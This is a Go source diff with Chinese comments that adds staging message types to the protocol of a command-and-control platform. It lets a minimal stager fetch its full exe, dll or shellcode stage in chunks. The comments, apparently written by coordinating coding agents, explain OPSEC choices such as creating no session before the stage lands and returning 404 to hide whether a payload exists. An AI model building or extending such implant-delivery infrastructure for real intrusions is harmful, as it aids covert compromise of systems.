@@ -283,3 +283,46 @@ type PullPayload struct {
 
 // PushPayload 是 t=file(push) 的 d:确认空对象。
 type PushPayload struct{}
+
+// ---- 三期追加(契约 C2_CONTRACTS.md §19,Agent P):staging 消息对 ----
+//
+// 本节是【追加】:不改动上方任何既有常量/结构(与 Agent T 并行工作的冲突面控制)。
+//
+// staged 产物(极简 stager)与完整 stage 走同一传输信道,新增一对话路:
+//   请求  t=stage_get  d=StageGetPayload   stager 拉取自己的 stage blob
+//   响应  t=stage_data d=StageDataPayload  平台按 offset/length 分片回(≤FileChunkSize)
+//
+// 协议向后兼容:旧 beacon 永不发这两个类型,即零影响(冻结语义只扩不改)。
+//
+// 【与一期规则的唯一偏差,集成者必读】stager 还不是会话——它没有 sid(在 stage
+// 落地、完整 beacon 跑起来之前不建会话行,这是 OPSEC 上的刻意选择)。因此处理核
+// (listener.go 的分发逻辑,Agent T 所有)需要把 stage_get 与 reg 同类对待:
+//   - 无 sid 放行;
+//   - nc 防重放按 "stage:"+token 记账(类比 reg 的 "uid:"+uid);
+//   - 校验:载荷存在、属于本监听器、artifact ∈ {exe,dll,shellcode} 且 staged=true,
+//     否则一律 404 语义(不暴露存在性)。
+// server 侧的 stage blob 解析已备好:server/c2_payload_api.go 的
+// (*Server).c2StageDataFor(按 token 读 <BaseDir>/c2/payloads/stage_<id>.bin 分片)。
+
+// TypeStageGet 是 stager→平台 的 stage 拉取请求类型。
+const TypeStageGet = "stage_get"
+
+// TypeStageData 是 平台→stager 的 stage 分片响应类型。
+const TypeStageData = "stage_data"
+
+// StageGetPayload 是 t=stage_get 的 d:stager 用自己的载荷 token 拉取 stage。
+//   - Token 必填(32 hex,即 CreatePayload 的 token;stager 里唯一凭据);
+//   - Offset/Length 语义与 FilePayload 的 pull 一致:Length<=0 取平台默认分片
+//     (FileChunkSize),响应带 EOF 收尾。
+type StageGetPayload struct {
+	Token  string `json:"tok"`
+	Offset int64  `json:"of,omitempty"`
+	Length int64  `json:"ln,omitempty"`
+}
+
+// StageDataPayload 是 t=stage_data 的 d:EOF 恒出现(stager 靠它判断收尾,同 PullPayload)。
+type StageDataPayload struct {
+	Data  []byte `json:"b,omitempty"` // b64 分片
+	EOF   bool   `json:"eof"`
+	Total int64  `json:"total,omitempty"` // stage 总字节数(首片带,便于 stager 预分配)
+}
